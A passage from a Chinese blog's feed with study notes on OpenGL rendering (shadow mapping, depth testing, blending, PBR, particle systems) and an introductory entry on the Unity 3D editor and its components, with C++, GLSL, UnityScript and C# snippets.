class="built_in">glTexParameteri</span>(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);</span><br><span class="line"><span class="built_in">glTexParameteri</span>(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);</span><br><span class="line"><span class="comment">// 附加到帧缓冲上</span></span><br><span class="line"><span class="built_in">glFramebufferTexture2D</span>(GL_FRAMEBUFFER, GL_DEPTH_ATTACHMENT, GL_TEXTURE_2D, texture, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 检查帧缓冲完整性</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">glCheckFramebufferStatus</span>(GL_FRAMEBUFFER) == GL_FRAMEBUFFER_COMPLETE)&#123;</span><br><span class="line">  <span class="comment">// 帧缓冲完整</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 处理后续工作</span></span><br><span class="line"><span class="built_in">glBindFramebuffer</span>(GL_FRAMEBUFFER, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">glDeleteFramebuffers</span>(<span class="number">1</span>, &amp;fbo);</span><br></pre></td></tr></table></figure>

<p>产生阴影效果：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 渲染阴影深度贴图</span></span><br><span class="line"><span class="built_in">glBindFramebuffer</span>(GL_FRAMEBUFFER, dpethMapFBO);</span><br><span class="line"><span class="built_in">glClearColor</span>(<span class="number">0.1f</span>, <span class="number">0.1f</span>, <span class="number">0.1f</span>, <span class="number">0.1f</span>);</span><br><span class="line"><span class="built_in">glClear</span>(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);</span><br><span class="line"><span class="built_in">glViewport</span>(<span class="number">0</span>, <span class="number">0</span>, SHADOW_WIDTH, SHADOW_HEIGHT);</span><br><span class="line"><span class="comment">// 传入着色器</span></span><br><span class="line">shaodwMap_shader.<span class="built_in">use</span>()</span><br><span class="line">shadowMap_shader.<span class="built_in">setMat4</span>(<span class="string">&quot;lightSpaceMatrix&quot;</span>, lightSpaceMatrix);</span><br><span class="line"><span class="built_in">renderScene</span>(shadowMap_shader);</span><br><span class="line"><span class="built_in">glBindFramebuffer</span>(GL_FRAMEBUFFER, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>利用帧缓冲中的shadow map，判断是否是阴影部分：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 判断阴影</span></span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">ShadowCalculation</span><span class="params">(vec4 flagPosLightSpace)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vec3 projCoords = fragPosLightSpace.xyz / fragPosLightSpace.w;</span><br><span class="line">  <span class="comment">// 变换范围到 0 1 之间</span></span><br><span class="line">  projCoords = projCoords * <span class="number">0.5</span> + <span class="number">0.5</span>;</span><br><span class="line">  <span class="type">float</span> closestDepth = <span class="built_in">texture</span>(shadowMap, porjCoores.xy).r;</span><br><span class="line">  <span class="type">float</span> currentDepth = projCoords.z;</span><br><span class="line">  <span class="type">float</span> shadow = currentDepth &gt; closestDepth ? <span class="number">1.0</span> : <span class="number">0.0</span>;</span><br><span class="line">  <span class="keyword">return</span> shadow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 渲染阴影</span></span><br><span class="line"><span class="type">float</span> shadow = <span class="built_in">ShadowCalculation</span>(fs_in.FragPosLightSpace);</span><br><span class="line">vec3 lighting = (ambient + (<span class="number">1.0</span> - shadow) * (diffuse + specular)) * color;</span><br></pre></td></tr></table></figure>

<p>问题：实际会遇到采样越界，阴影失真，锯齿感等问题。</p>
<h3 id="片元操作"><a href="#片元操作" class="headerlink" title="片元操作"></a>片元操作</h3><p>片元操作包括</p>
<ul>
<li>模板测试：遮罩效果</li>
<li>深度测试：透明，半透明，不透明效果</li>
<li>颜色混合：运动模糊，泛光效果等</li>
<li>最终输出到颜色缓冲区</li>
</ul>
<p>颜色缓存：存储每个像素点颜色值</p>
<p>深度缓存：存储每个像素点的深度值</p>
<p>模板缓存：存储模板，用于显示输出区域，例如规定值为<code>1</code>的点会被显示</p>
<p>累计缓存：存储像素点的颜色值，用于合成多幅图像。产生反锯齿，反走样等内容。</p>
<h4 id="消隐操作"><a href="#消隐操作" class="headerlink" title="消隐操作"></a>消隐操作</h4><p>消隐：决定场景中哪些物体可见，哪些物体被遮挡。</p>
<p>面剔除分析：基于面的正反面定义。</p>
<p>后向面判别：观察方向为V，面法向量为N，如果<code>(V * N &gt; 0)</code>，则是后向面，不可见。</p>
<p>后向面判别是在深度测试之前进行，可以减轻计算压力。</p>
<p>深度测试算法：</p>
<ul>
<li>深度缓冲器算法 Z-buffer：对每个像素点找到距离视点最近的片元，也就是最靠近屏幕的片元。<ul>
<li>步骤：<ul>
<li>初始化：将深度缓存与帧缓存中所有的单元(x, y)初始化：<ul>
<li>深度缓存中各个(x, y)单元置为z的最大值1</li>
<li>帧缓存中各(x, y)单元颜色置为背景色</li>
</ul>
</li>
<li>处理场景中每个多边形：<ul>
<li>计算多边形上各个点(x, y)的深度值z<ul>
<li>如果在前面，则计入深度缓存和帧缓存</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>深度排序算法 画家算法：<ul>
<li>步骤：<ul>
<li>深度排序：将多边形按照深度优先级排序，存入队列N中，进的优先级高，远的优先级低。</li>
<li>扫描转换：从队列N中逐个选择多个多边形绘制，由优先级低的开始绘制，逐个对多边形进行扫描转换。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>在OpenGL中可以直接进行面剔除：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">glEnable</span>(GL_CULL_FACE); </span><br><span class="line"><span class="built_in">glCullFace</span>(mode); <span class="comment">// mode：GL_FRONT GL_BACK GL_FRONT_AND_BACK</span></span><br><span class="line"><span class="comment">// 深度测试默认是关闭状态，需要的时候可以打开</span></span><br><span class="line"><span class="built_in">glEnable</span>(GL_DEPTH_TEST);</span><br></pre></td></tr></table></figure>

<h4 id="透明处理"><a href="#透明处理" class="headerlink" title="透明处理"></a>透明处理</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 开启混合</span></span><br><span class="line"><span class="built_in">glEnable</span>(GL_BLEND);</span><br><span class="line"><span class="comment">// 设置混合的源和目标因子</span></span><br><span class="line"><span class="comment">// GL_SRC_ALPHA 从纹理对于的PNG图片获取不透明值</span></span><br><span class="line"><span class="comment">// GL_ONE_MINUS_SRC_ALPHA = 1 - GL_SRC_ALPHA</span></span><br><span class="line"><span class="built_in">glBlendFunc</span>(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);</span><br></pre></td></tr></table></figure>

<p>对于不透明物体，使用深度缓冲正常绘制。<br>对于透明物体，需按照透明物体距离摄像头，由远到近绘制所有透明物体</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 排序</span></span><br><span class="line">std::map&lt;<span class="type">float</span>, glm::vec3&gt; sorted;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; windows.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">  <span class="type">float</span> distance = glm::<span class="built_in">length</span>(camera.Position - windows[i]);</span><br><span class="line">  sorted[distance] = windows[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 绘制</span></span><br><span class="line"><span class="keyword">for</span>(</span><br><span class="line">  std::map&lt;<span class="type">float</span>, glm::vec3&gt;::reverse_iterator it = sorted.<span class="built_in">rbegin</span>();</span><br><span class="line">  it != sorted.<span class="built_in">rend</span>();</span><br><span class="line">  it++)</span><br><span class="line">  &#123;</span><br><span class="line">    model = glm::<span class="built_in">mat4</span>(<span class="number">1.0f</span>);</span><br><span class="line">    model = glm::<span class="built_in">translate</span>(model, it-&gt;second);</span><br><span class="line">    shader.<span class="built_in">setMat4</span>(<span class="string">&quot;model&quot;</span>, model);</span><br><span class="line">    <span class="built_in">glDrawArrays</span>(GL_TRIANGLES, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="图形学进阶"><a href="#图形学进阶" class="headerlink" title="图形学进阶"></a>图形学进阶</h2><h3 id="PBR-基于物理的渲染方式"><a href="#PBR-基于物理的渲染方式" class="headerlink" title="PBR 基于物理的渲染方式"></a>PBR 基于物理的渲染方式</h3><p>使用符合物理学的方式模拟光线，核心技术是BRDF(双向反射分布函数)，描述物体表面将光从任何一个入射方向到任何一个反射方向的反射特性。</p>
<p>常见PBR模型：</p>
<ul>
<li>Lambert 漫反射模型</li>
<li>Phong 模型</li>
<li>Blinn-Phong 模型</li>
<li>快速 Phong 模型</li>
<li>可逆 Phong 模型</li>
<li>Cook-Torrance BRDF 模型</li>
<li>Ward BRDF 模型</li>
</ul>
<p>其中后两项是基于物理的BRDF模型。</p>
<p>主要理论：</p>
<ul>
<li>次表面散射：对于半透明物体，光线射入后在其内部发生散射，最后射出物体并进入视野中产生的现象。光除了从原来的入射点射出，也有部分从内部的其他点射出。</li>
<li>菲涅尔反射：当光经过折射率不同的界面上，会有部分光反射，部分光折射。反射部分的大小和观察角度有关，例如全反射现象。圆球上边缘的地方容易发生全反射，中间则偏透射。</li>
<li>微平面理论：物体表面是一系列细小的，肉眼不可见的微平面构成的宏平面。整体有一个法向量N，每个微平面有单独的法向量N’，计算反射光线使用N’。实际采用NDF函数(发现分布函数 D(h) )来描述。使用方法：向NDF输入一个朝向h，函数返回朝向h的微表面占总体的比例。这样得到的高光反射是模糊的。</li>
</ul>
<h3 id="游戏中的渲染技术"><a href="#游戏中的渲染技术" class="headerlink" title="游戏中的渲染技术"></a>游戏中的渲染技术</h3><p>为了提高真实感：</p>
<ul>
<li>运动模糊：通过合并有微小位移的多幅图像</li>
<li>镜头泛光：由于透镜无法理想的聚焦而产生的辉光。</li>
</ul>
<p>为了提高实时性：</p>
<ul>
<li>天空盒</li>
<li>公告板：总是面向观察者，粒子效果</li>
<li>延迟渲染</li>
<li>层次细节</li>
</ul>
<p>正向渲染：先进行光照计算，再进行深度测试</p>
<p>延迟渲染：先进行深度测试，再进行光照计算</p>
<p>层次细节LOD：根据距离动态的渲染不同细节的模型，合理分配渲染资源。</p>
<h3 id="粒子系统-1"><a href="#粒子系统-1" class="headerlink" title="粒子系统"></a>粒子系统</h3><p>数据处理：生成顶点数据，生成绑定VBO和VAO，设置属性指针。</p>
<p>生成顶点数据：</p>
<ul>
<li>粒子的定义</li>
<li>粒子的产生</li>
<li>粒子的模拟</li>
<li>粒子的排序</li>
</ul>
<p>粒子的定义：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Particle</span>&#123;</span><br><span class="line">  glm::vec3 pos, speed;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> r, g, b, a;</span><br><span class="line">  <span class="type">float</span> size;</span><br><span class="line">  <span class="type">float</span> life;</span><br><span class="line">  <span class="type">float</span> cameradistance;</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span>&lt;(<span class="type">const</span> Particle&amp; that) <span class="type">const</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;cameradistance &gt; that.cameradistance;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>粒子系统的属性：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> MaxParticles = <span class="number">200</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">float</span> life = <span class="number">2.0</span>;</span><br><span class="line">glm::vec3 startPos = glm::<span class="built_in">vec3</span>(<span class="number">0.0f</span>, <span class="number">0</span>, <span class="number">0.0f</span>); <span class="comment">// 粒子起点</span></span><br><span class="line">glm::vec3 endPos = glm::<span class="built_in">vec3</span>(<span class="number">0.0f</span>, <span class="number">0</span>, <span class="number">4.8f</span>); <span class="comment">// 粒子起点</span></span><br><span class="line">Particle ParticleContainer[MaxParticles];</span><br></pre></td></tr></table></figure>

<p>粒子的产生：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> newparticles = deltaTime / life * MaxParticles;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;newParticles; i++)&#123;</span><br><span class="line">  <span class="comment">// 找出已经消亡的粒子，重新使用</span></span><br><span class="line">  <span class="type">int</span> particleIndex = <span class="built_in">FindUnusedPartticle</span>();</span><br><span class="line">  ParticlesContainer[particleIndex].life = life;</span><br><span class="line">  glm::vec3 maindir = glm::<span class="built_in">vec3</span>(<span class="number">0.0f</span>, <span class="number">10.0f</span>, <span class="number">0.0f</span>); <span class="comment">//  主要方向</span></span><br><span class="line">  ParticlesContainer[particleIndex].pos = startPos + randomdOffset; <span class="comment">// 起点</span></span><br><span class="line">  ParticlesContainer[particleIndex].speed = (endPos - startPos) / life;</span><br><span class="line">  <span class="comment">// 产生随机颜色，透明度，大小等其他属性</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>粒子模拟：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> ParticlesCount = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;MaxParticles; i++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(p.life &gt; <span class="number">0.0f</span>)&#123;</span><br><span class="line">    p.life -= deltaTime;</span><br><span class="line">    <span class="keyword">if</span>(p.life &gt; <span class="number">0.0f</span>)&#123;</span><br><span class="line">      p.pos +=  p.speed * (<span class="type">float</span>)deltaTime;</span><br><span class="line">      <span class="comment">// 将粒子p的位置，大小，颜色填充到数组particle_position_size_data particle_color_data中</span></span><br><span class="line">      p.cameradistance = glm::<span class="built_in">length</span>(p.pos - CameraPosition);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 如果消亡，则排序后，会被放到数组的最后</span></span><br><span class="line">      p.cameradistance = <span class="number">-1.0f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ParticlesCount++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">SortParticles</span>();</span><br></pre></td></tr></table></figure>

<p>粒子的渲染：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">glBindVertexArray</span>(VertexArrayID);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;ParticlesCount;i++)&#123;</span><br><span class="line">  shader.<span class="built_in">setVec4</span>(<span class="string">&quot;xyzs&quot;</span>, </span><br><span class="line">    particle_position_size_data[<span class="number">4</span>*i+<span class="number">0</span>],</span><br><span class="line">    particle_position_size_data[<span class="number">4</span>*i+<span class="number">1</span>],</span><br><span class="line">    particle_position_size_data[<span class="number">4</span>*i+<span class="number">2</span>],</span><br><span class="line">    particle_position_size_data[<span class="number">4</span>*i+<span class="number">3</span>],</span><br><span class="line">  );</span><br><span class="line">  shader.<span class="built_in">setVec4</span>(<span class="string">&quot;color&quot;</span>,</span><br><span class="line">    particle_color_data[<span class="number">4</span>*i+<span class="number">0</span>],</span><br><span class="line">    particle_color_data[<span class="number">4</span>*i+<span class="number">1</span>],</span><br><span class="line">    particle_color_data[<span class="number">4</span>*i+<span class="number">2</span>],</span><br><span class="line">    particle_color_data[<span class="number">4</span>*i+<span class="number">3</span>],</span><br><span class="line">  )</span><br><span class="line">  <span class="built_in">glDrawArrays</span>(GL_TRIANGLE_STRIP, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>公告板技术：根据粒子中心在世界的坐标，以及相机的Up和Right向量，计算粒子的4个顶点坐标，使其始终面向摄像机。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vec3 vertexPosition_worldspace = particleCenter_worldspace </span><br><span class="line">  + CameraRight_worldspace * particleSize</span><br><span class="line">  + CameraUp_worldspace * particleSize;</span><br></pre></td></tr></table></figure>



















]]></content>
      <categories>
        <category>游戏与3D</category>
      </categories>
      <tags>
        <tag>计算机图形学</tag>
        <tag>Shader</tag>
        <tag>OpenGL</tag>
      </tags>
  </entry>
  <entry>
    <title>Unity 3D</title>
    <url>/2020/03/18/%E6%B8%B8%E6%88%8F/Unity3d/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h2 id="开发游戏"><a href="#开发游戏" class="headerlink" title="开发游戏"></a>开发游戏</h2><h3 id="游戏引擎与API"><a href="#游戏引擎与API" class="headerlink" title="游戏引擎与API"></a>游戏引擎与API</h3><p>常用游戏引擎有：Unity，UE4，Cocos，laya，白鹭等。<br>常用开发API有：DirectX，OpenGL，Vulkan等。</p>
<h3 id="人员分工"><a href="#人员分工" class="headerlink" title="人员分工"></a>人员分工</h3><p>程序：</p>
<ul>
<li>服务端</li>
<li>客户端<ul>
<li>UI 实现</li>
<li>业务逻辑</li>
<li>动画实现</li>
<li>计费SDK</li>
</ul>
</li>
<li>工具开发</li>
<li>运营数据系统</li>
</ul>
<p>美工：</p>
<ul>
<li>原画</li>
<li>3D建筑</li>
<li>3D角色</li>
<li>动画</li>
<li>特效</li>
<li>地形编辑</li>
<li>UI 界面</li>
<li>灯光</li>
<li>场景</li>
<li>TA：即懂美术也懂程序，写Shader的</li>
</ul>
<p>策划：</p>
<ul>
<li>系统策划</li>
<li>剧情策划</li>
<li>数值策划</li>
<li>关卡策划</li>
<li>任务策划</li>
<li>执行策划：盯着程序员的</li>
</ul>
<h2 id="Unity-操作"><a href="#Unity-操作" class="headerlink" title="Unity 操作"></a>Unity 操作</h2><h3 id="界面介绍"><a href="#界面介绍" class="headerlink" title="界面介绍"></a>界面介绍</h3><p>项目：由场景构成<br>场景 Sence：由游戏对象构成（看见的对象，光源，摄像机等）<br>游戏对象：由组件构成<br>组件：拥有多个属性</p>
<p>菜单栏：</p>
<ul>
<li>File：场景操作和项目操作。</li>
<li>Edit：复制粘贴等<ul>
<li>Duplicate：复制，包括Copy与Paste</li>
<li>Prefrence：首选项</li>
</ul>
</li>
<li>Assets：资源<ul>
<li>Create：创建</li>
<li>Import：导入资源包</li>
</ul>
</li>
<li>GameObject：游戏对象<ul>
<li>Create</li>
<li>2D Object</li>
<li>3D Object</li>
<li>Effects</li>
<li>Light</li>
<li>Audio</li>
<li>Video</li>
<li>UI</li>
<li>Camera</li>
</ul>
</li>
<li>Component：<ul>
<li>Mesh</li>
<li>Effects</li>
<li>Physics</li>
<li>Physics 2D</li>
<li>Navigation</li>
<li>Audio</li>
<li>Video</li>
<li>Rendering</li>
<li>Layout</li>
<li>Playables</li>
<li>AR</li>
<li>Miscellaneous</li>
<li>Analytics</li>
<li>UI</li>
<li>Scripts</li>
<li>Events</li>
</ul>
</li>
<li>Window：面板控制</li>
<li>Help<ul>
<li>Scripting Reference：手册</li>
</ul>
</li>
</ul>
<p>Layout：布局方式<br>Project：项目面板，管理所有文件<br>Scene：场景面板，列出场景中的所有对象<br>Game：游戏面板，玩家看到的面板，由摄像机拍摄<br>Hierarchy：层级，管理场景中的所有游戏对象<br>Inspector：显示游戏对象上的组件及组件属性<br>Layers：</p>
<ul>
<li>层，用于管理文件组。</li>
<li>系统保留8个层，共有32个层。</li>
</ul>
<h3 id="坐标系"><a href="#坐标系" class="headerlink" title="坐标系"></a>坐标系</h3><p>Untiy 使用左手系。</p>
<p>ISO：正交视图<br>Persp：透视视图</p>
<h3 id="场景操作"><a href="#场景操作" class="headerlink" title="场景操作"></a>场景操作</h3><p>鼠标操作：</p>
<ul>
<li>旋转：鼠标右键 &#x2F; Alt + 左键</li>
<li>缩放：Alt + 鼠标右键 &#x2F; 滚轮</li>
<li>平移：鼠标中键 &#x2F; 上方手</li>
<li>锁：禁止旋转</li>
<li>选中多个：Shift + 点选</li>
</ul>
<p>上方工具栏（快捷键）：</p>
<ul>
<li>平移场景 Q</li>
<li>移动物体 W</li>
<li>旋转物体 E</li>
<li>缩放物体 R</li>
<li>2D缩放物体 T</li>
<li>Center &#x2F; Pivot：坐标轴位置 Z</li>
<li>Global &#x2F; Local：切换坐标系 X</li>
</ul>
<p>快捷键：</p>
<ul>
<li>V：顶点捕捉</li>
<li>Ctrl + D：复制</li>
<li>Ctrl：角度捕捉</li>
</ul>
<h2 id="Unity-资源"><a href="#Unity-资源" class="headerlink" title="Unity 资源"></a>Unity 资源</h2><h3 id="项目目录"><a href="#项目目录" class="headerlink" title="项目目录"></a>项目目录</h3><p>Assets：管理资源文件</p>
<ul>
<li>Animations</li>
<li>Animators</li>
<li>Audio</li>
<li>Done</li>
<li>Fonts</li>
<li>Gizmos</li>
<li>Materials</li>
<li>Models</li>
<li>Prefabs</li>
<li>Scenes</li>
<li>Scripts</li>
<li>Shaders</li>
<li>Textures<br>特殊</li>
<li>Standard Assets：内置优先加载</li>
<li>Editor：扩展编辑器</li>
<li>Plugins：插件Dll</li>
<li>Resources：资源文件</li>
</ul>
<h3 id="材质-Material"><a href="#材质-Material" class="headerlink" title="材质 Material"></a>材质 Material</h3><p>可以配置颜色，图片。<br>可以添加着色器。</p>
<h3 id="着色器"><a href="#着色器" class="headerlink" title="着色器"></a>着色器</h3><p>Diffuse：Base贴图。<br>Bumped Diffuse：Base贴图和法线贴图。<br>Bumped Specular：再加入高光材质。</p>
<h3 id="纹理贴图"><a href="#纹理贴图" class="headerlink" title="纹理贴图"></a>纹理贴图</h3><p>尺寸需要被2整除（256*256）。</p>
<p>可以创建法线贴图。<br>Texture Type：贴图类型<br>MaxSize：纹理取样尺寸。</p>
<p>Substance Designer：一款材质制作工具。</p>
<p>GUI 纹理显示：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">OnGUI</span>(<span class="params"></span>)&#123;&#125;  <span class="comment">// GUI 启动</span></span><br><span class="line"><span class="title class_">Resources</span>.<span class="title class_">Load</span>()    <span class="comment">// 加载Resources文件夹</span></span><br><span class="line"><span class="title class_">Resources</span>.<span class="title class_">LoadAll</span>()</span><br><span class="line"><span class="variable constant_">GUI</span>.<span class="title class_">DrawTexutre</span>()</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">private <span class="keyword">var</span> <span class="attr">oneTexture</span>:<span class="title class_">Texture2D</span>;</span><br><span class="line">private <span class="keyword">var</span> <span class="attr">allTexutre</span>:<span class="title class_">Object</span>[];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">OnGUI</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable constant_">GUI</span>.<span class="title class_">Button</span>(<span class="title class_">Rect</span>(<span class="number">0</span>,<span class="number">20100</span>,<span class="number">60</span>), <span class="string">&quot;loadOne&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(oneTexutre == <span class="literal">null</span>)&#123;</span><br><span class="line">            oneTexture = <span class="title class_">Resources</span>.<span class="title class_">Load</span>(<span class="string">&quot;one/Grass&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable constant_">GUI</span>.<span class="title class_">Button</span>(<span class="title class_">Rect</span>(<span class="number">0</span>,<span class="number">20100</span>,<span class="number">60</span>), <span class="string">&quot;loadAll&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(allTexutre == <span class="literal">null</span>)&#123;</span><br><span class="line">            allTexutre = <span class="title class_">Resources</span>.<span class="title class_">Load</span>(<span class="string">&quot;all&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(allTexutre!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;allTexture.<span class="property">Length</span>;i++)&#123;</span><br><span class="line">            <span class="variable constant_">GUI</span>.<span class="title class_">DrawTexture</span>(<span class="title class_">Rect</span>(<span class="number">110</span>+i*<span class="number">120</span>,<span class="number">140</span>,<span class="number">120</span>,<span class="number">120</span>), allTexutre[i],<span class="title class_">ScaleMode</span>.<span class="property">StretchToFill</span>,<span class="literal">true</span>,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Moive纹理，是一个动画纹理。导入后转为OGG格式。</p>
<h3 id="模型-FBS"><a href="#模型-FBS" class="headerlink" title="模型 FBS"></a>模型 FBS</h3><p>模型一般有FBS，OBJ格式，一般使用FBS。<br>如果导出的是3DMAX等文件，可以用Blend，Untiy转换为FBX。</p>
<p>编辑时尽量让z轴朝向前方，以便以后程序控制。</p>
<p>对于动画，可以导出一个动画，再在Untiy中分割成多个动画；也可以导出为多个文件。但是多文件时命名要遵循<code>模型@动画</code>命名规则。</p>
<p>Model：</p>
<ul>
<li>Meshes：缩放因子 0.01，MeshCompression 网格压缩，ReadWriteEnable 运行时修改，OptimizeMesh 优化，GenerateColliders 碰撞（对固定物体较好），SwapUV，GenerateLightMapUV</li>
<li>Normals &amp; Tangents：法线切线（输入，计算），SplitTangents 分割法线</li>
<li>Materials：导入材质，材质命名，材质搜索<br>Rig：动画类型，人&#x2F;物。<br>Animations：动画如何分割。</li>
</ul>
<p>模型：</p>
<ul>
<li>组成部分</li>
<li>网格</li>
<li>动画</li>
</ul>
<p>控制模型：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Move</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span>&#123;</span><br><span class="line">        <span class="built_in">float</span> horizontal = Input.GetAxis(<span class="string">&quot;Horizontal&quot;</span>);</span><br><span class="line">        <span class="built_in">float</span> vertical = Input.GetAxis(<span class="string">&quot;Vertical&quot;</span>);</span><br><span class="line">        Vector3 direction = <span class="keyword">new</span> Vector3(horizontal, <span class="number">0</span>, vertical);</span><br><span class="line">        <span class="keyword">if</span>(direction!=Vector3.zero)&#123;</span><br><span class="line">            transform.GetComponent&lt;Animation&gt;().CrossFade(<span class="string">&quot;walk&quot;</span>);</span><br><span class="line">            transform.rotation = Quaternion.LookRotation(direction);</span><br><span class="line">            transform.Translate(Vector3.forward * <span class="number">1</span> * Time.deltaTime);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            transform.GetComponent&lt;Animation&gt;().CrossFade(<span class="string">&quot;idle&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">OnCollisionEnter</span>(<span class="params">Collision collision</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(collision.gameObject.name == <span class="string">&quot;Plane&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        transform.GetComponient&lt;Animation&gt;().CrossFade(<span class="string">&quot;bite&quot;</span>);</span><br><span class="line">        collision.transofrm.GetComponent&lt;Animation&gt;(<span class="string">&quot;die&quot;</span>);</span><br><span class="line">        Destroy(collision.gameObject, <span class="number">5f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="声音"><a href="#声音" class="headerlink" title="声音"></a>声音</h3><p>是否为3D声音：有距离感。<br>载入方式。</p>
<p>音源组件：发出声音的物体。<br>声音监听组件：听到声音的物体。</p>
<h3 id="预设体-Prefabs"><a href="#预设体-Prefabs" class="headerlink" title="预设体 Prefabs"></a>预设体 Prefabs</h3><p>用来批量管理游戏对象。<br>也可以批量添加预设物体。</p>
<p>可以将游戏对以文件形式存储起来：从层级面板拖入项目目录即可。</p>
<p>Select：快速找到该预设体。<br>Revert：还原为预设体中的设置。<br>Apply：将修改后的设置放入预设体。</p>
<h3 id="游戏对象"><a href="#游戏对象" class="headerlink" title="游戏对象"></a>游戏对象</h3><p>层级关系：<br>子物体的Transform是相对于父物体的</p>
<p>基本对象：<br>Cube<br>Sphere<br>Plane：由多个三角形构成<br>Quad：由2个三角形构成<br>Terrain：地形</p>
<p>Tag：属于某一个类。<br>Layer：属于某一个层。</p>
<p>搜索对象：在层级面板双击 &#x2F; 单击，在场景中按 F</p>
<p>对象组件：<br>Transform：位置 &#x2F; 旋转 &#x2F; 缩放<br>Mesh Filter：决定游戏对象的形状<br>Mesh Rendeer：决定游戏对象的外观展示</p>
<ul>
<li>Material：材质</li>
</ul>
<h3 id="刚体碰撞组件"><a href="#刚体碰撞组件" class="headerlink" title="刚体碰撞组件"></a>刚体碰撞组件</h3><p>Rigidbody：刚体组件，模拟物理效果</p>
<ul>
<li>Mass：质量</li>
<li>Drag：拉力，阻力</li>
<li>Angular Drag：旋转拉力</li>
<li>Use Gravity：重力</li>
<li>Is Kinematic：开启运动学，不受力</li>
<li>Interpolate：插值</li>
<li>Collision Detection：碰撞检测</li>
<li>Constraints：约束<br>Collider：碰撞体组件</li>
<li>用于碰撞检测</li>
<li>可以编辑碰撞体</li>
<li>is trigger</li>
<li>material：物理材质<ul>
<li>dynamic friction：动态摩擦力</li>
<li>static friction：静态摩擦力</li>
<li>bounciness：弹力</li>
<li>friction combine：组合摩擦力</li>
<li>bounce combine：组合弹力</li>
</ul>
</li>
<li>center</li>
<li>size</li>
</ul>
